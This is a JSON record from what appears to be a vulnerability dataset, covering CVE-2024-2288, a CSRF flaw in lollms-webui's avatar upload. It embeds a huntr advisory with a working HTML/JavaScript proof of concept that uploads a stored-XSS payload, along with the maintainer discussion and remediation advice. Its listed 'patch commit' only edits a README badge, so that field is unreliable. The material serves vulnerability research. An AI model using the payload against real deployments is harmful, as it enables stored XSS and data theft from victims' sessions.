{
    "CVE-2024-2288": {
        "published_date": "2024-06-06T18:24:08.214Z",
        "patch_commits": [
            {
                "url": "https://github.com/parisneo/lollms-webui/commit/ed085e6effab2b1e25ba2b00366a16ff67d8551b",
                "content": "Merge pull request #506 from ParisNeo/ParisNeo-patch-3\n\nUpdate README.md\n\nFilename: README.md:\n```\n@@ -8,7 +8,7 @@\n![GitHub stars](https://img.shields.io/github/stars/ParisNeo/lollms-webui)\n ![GitHub forks](https://img.shields.io/github/forks/ParisNeo/lollms-webui)\n [![Discord](https://img.shields.io/discord/1092918764925882418?color=7289da&label=Discord&logo=discord&logoColor=ffffff)](https://discord.gg/4rR282WJb6)\n-[![Follow me on X](https://img.shields.io/twitter/follow/SpaceNerduino?style=social)](https://twitter.com/ParisNeo_AI)\n+[![Follow me on X](https://img.shields.io/twitter/follow/ParisNeo_AI?style=social)](https://twitter.com/ParisNeo_AI)\n [![Follow Me on YouTube](https://img.shields.io/badge/Follow%20Me%20on-YouTube-red?style=flat&logo=youtube)](https://www.youtube.com/user/Parisneo)\n \n ## LoLLMs core library download statistics\n```"
            }
        ],
        "sw_version": "v9.2",
        "sw_version_wget": "https://github.com/parisneo/lollms-webui/archive/refs/tags/v9.2.zip",
        "description": "A Cross-Site Request Forgery (CSRF) vulnerability exists in the profile picture upload functionality of the Lollms application, specifically in the parisneo/lollms-webui repository, affecting versions up to 7.3.0. This vulnerability allows attackers to change a victim's profile picture without their consent, potentially leading to a denial of service by overloading the filesystem with files. Additionally, this flaw can be exploited to perform a stored cross-site scripting (XSS) attack, enabling attackers to execute arbitrary JavaScript in the context of the victim's browser session. The issue is resolved in version 9.3.",
        "sec_adv": [
            {
                "url": "https://huntr.com/bounties/2a37ae0c-890a-401a-8f3c-a261f3006290",
                "content": "Bounties\nPartners\nCommunity\nInfo\nSUBMIT REPORT\nCSRF File Upload in parisneo/lollms-webui\nValid\nReported on Mar 2nd 2024\nDescription\nThe profile picture upload functionality in the Lollms application is vulnerable to a CSRF attack that allows any attacker to change a victim's profile picture. This may also be used to overflow the filesystem with files and could cause a denial of service. This was also used to perform a stored cross-site scripting attack remotely.\nProof of Concept\nAn attacker can use CSRF to make the victim upload a malicious image, and then redirect the user to that image.\n<html>\n  <body>\n    <script>\n      function submitRequest()\n      {\n        var xhr = new XMLHttpRequest();\n        xhr.open(\"POST\", \"http:\\/\\/localhost:9600\\/upload_avatar\", true);\n        xhr.setRequestHeader(\"Content-Type\", \"multipart\\/form-data; boundary=---------------------------7469129296923044552541602996\");\n        xhr.withCredentials = true;\n        var body = \"-----------------------------7469129296923044552541602996\\r\\n\" + \n          \"Content-Disposition: form-data; name=\\\"avatar\\\"; filename=\\\"image.html\\\"\\r\\n\" + \n          \"Content-Type: application/html\\r\\n\" + \n          \"\\r\\n\" + \n          \"\\x3cimg src=x onerror=alert(\\\"CSRF\\\")\\x3e\\n\" + \n          \"\\r\\n\" + \n          \"-----------------------------7469129296923044552541602996--\\r\\n\";\n        var aBody = new Uint8Array(body.length);\n        for (var i = 0; i < aBody.length; i++)\n          aBody[i] = body.charCodeAt(i); \n        xhr.send(new Blob([aBody]));\n      }\n      submitRequest();\n            window.location.href = \"http://localhost:9600/user_infos/image.html\";\n    </script>\n    <form action=\"#\">\n      <input type=\"button\" value=\"Submit request\" onclick=\"submitRequest();\" />\n    </form>\n  </body>\n</html>\nSo if an attacker hosts this, they can automatically get XSS on the victim's browser, and thus READ ALL DATA present within the Lollms-webui application, WITHOUT requiring network access to the application.\nImpact\nThis CSRF allows any attacker to force the victim into changing their profile picture. This can be used to abuse other vulnerabilities, as well as lead to denial of service by continuously uploading large files.\nWe are processing your report and will contact theparisneo/lollms-webui team within 24 hours.a year ago\nWe have contacted a member of theparisneo/lollms-webui team and are waiting to hear backa year ago\nDan McInerneymodified the Severity from High (8.1) to High (8.3)a year ago\nDan McInerney\ncommenteda year ago\nAdmin\nThis looks accurate. Adding a simple CSRF token mechanism to the should fix this.\nSaifeddine ALOUI\ncommenteda year ago\nMaintainer\nAre you sure? The upload_avatar don't accept html it ensures the received is an image not anything else then renames it randomly then saves it. Here is the code:\n@router.post(\"/upload_avatar\")\nasync def upload_avatar(avatar: UploadFile = File(...)):\n    \"\"\"\n    Uploads a user avatar file to a dedicated directory, preventing path traversal attacks.\n\n    Parameters:\n        - avatar: UploadFile object representing the user avatar file.\n\n    Returns:\n        - Dictionary with the status of the upload and the generated file name.\n\n    Raises:\n        - HTTPException with a 400 status code and an error message if the file is invalid or has an invalid type.\n    \"\"\"\n    # Only allow certain file types\n    if avatar.filename.endswith((\".jpg\", \".png\")):\n        # Create a random file name\n        random_filename = str(uuid.uuid4())\n        \n        # Use the file extension of the uploaded file\n        extension = os.path.splitext(avatar.filename)[1]\n        \n        # Create the new file path in a dedicated directory\n        file_location = os.path.join(lollmsElfServer.lollms_paths.personal_user_infos_path, f\"{random_filename}{extension}\")\n\n        try:\n            # Open the image to check if it's a valid image\n            img = Image.open(avatar.file)\n            \n            # Save the file\n            img.save(file_location)\n        except Exception as e:\n            raise HTTPException(status_code=400, detail=\"Invalid image file.\")\n    else:\n        raise HTTPException(status_code=400, detail=\"Invalid file type.\")\n        \n    return {\"status\": True,\"fileName\": f\"{random_filename}{extension}\"}\nA parisneo/lollms-webui maintainerhas acknowledged this reporta year ago\nThe scheduled publication date was automatically extended from 17th Apr 2024  to 24th Apr 2024  due to the maintainers acknowledgement of the reporta year ago\nSaifeddine ALOUI\ncommenteda year ago\nMaintainer\nAh sorry I just saw that you are talking about v 7.3.0 It is an old version, now we are at 9.3 which is protected against this\nSaifeddine ALOUI\ncommenteda year ago\nMaintainer\nAh I see, you are talking about lollms in pypi! Sorry didn't see that one. all I need to do is just upload the updated version. Sorry I did not upodate the pipy version for ages. Thanks for telling me about that\npinkdraconian\ncommenteda year ago\nResearcher\nHi Saifeddine,\nThis report was originally reported on February 12th together with https://huntr.com/bounties/f1adaac0-b9ed-4093-a0f3-2d0a4ecba398/. But we decided to split up the two reports so that they can be handled separately.\nI believe that you also fixed this and the other report but perhaps forgot to accept them?\nThe researcher has received a minor penalty to their credibility for miscalculating the severity: -1\nSaifeddine ALOUI validated this vulnerabilitya year ago\npinkdraconianhas been awarded the disclosure bounty\nThe fix bounty is now up for grabs\nThe researcher's credibility has increased: +7\nCVE-2024-2288assigned to this report.a year ago\nSaifeddine ALOUImarked this as fixedin 9.3with commited085ea year ago\nSaifeddine ALOUIhas been awarded the fix bounty\npinkdraconian\ncommenteda year ago\nResearcher\nHi Saifeddine,\nI want to add some context here to help you better remediate this finding. In the current latest version of the application, this is still present.\nThe file is still uploaded even though CORS does not allow the attacker to read the outcome, the file is still uploaded\nTo fix it I would do either one of these things:\nCheck that the Origin request header is correct. It should probably be similar to the Host header.\nIn the front-end when uploading the file, you add a header Lollms: <3 and then in the backend you make sure that that header is set. An attacker cannot set the header because they are working from a cross-site domain, so if the header is set then you know the request came from the frontend\nThe goal here is to make sure that a \"simple\" request cannot be made as they bypass the Same Origin Policy. Here's a simplified explanation for you.\nSo in HTTP you have \"simple\" requests and \"complex\" requests\nSimple requests bypass the Same Origin Policy. An example of simple requests are GET requests, those are always allowed to be made to any site\nComplex requests are all other types like PUT, DELETE, etc. For these, the browser has the same origin policy so that \"attacker.com\" cannot make PUT requests to \"google.com\" for example\nHowever POST requests are a tricky case here.\nPOST requests are simple, as long as they use a specific content-type, they don't add any headers, etc.\nThis is because of backwards compatibility to allow forms that POST to different domains to work\nBut anything that wouldn't be possible in a HTML form with POST is considered complex So by adding the Lollms: <3 header and only accepting the request if it is set, you force the server to only accept complex requests, which an attacker can't make because of the same origin policy.\nWe have sent a warning to the parisneo/lollms-webui team to inform them that this report will be published in 48 hoursa year ago\nThis vulnerability has now been publisheda year ago\nCVE-2024-2288has now been publisheda year ago\nSign in to join this conversation\nCVE\nCVE-2024-2288\n(Published)\nVulnerability Type\nCWE-352: Cross-Site Request Forgery (CSRF)\nSeverity\nHigh (8.3)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nLow\nAvailability\nHigh\nOpen in visual CVSS calculator\nRegistry\nPypi\nAffected Version\n7.3.0\nVisibility\nPublic\nStatus\nFixed\nDisclosure Bounty\n$450\nFix Bounty\n$112.5\nFound by\npinkdraconian\n@pinkdraconian\nMIDDLEWEIGHT\nFixed by\nSupported by Protect AI and leading the way to MLSecOps and greater AI security.\nÂ© 2024\nPrivacy Policy\nTerms of Service\nCode of Conduct\nCookie Preferences\nContact Us",
                "effective": true,
                "effective_reason": "The advisory includes a script and description showing exactly how to exploit the vulnerability, demonstrating practicality."
            }
        ],
        "cwe": [
            {
                "id": "CWE-352",
                "value": "CWE-352 Cross-Site Request Forgery (CSRF)"
            }
        ]
    }
}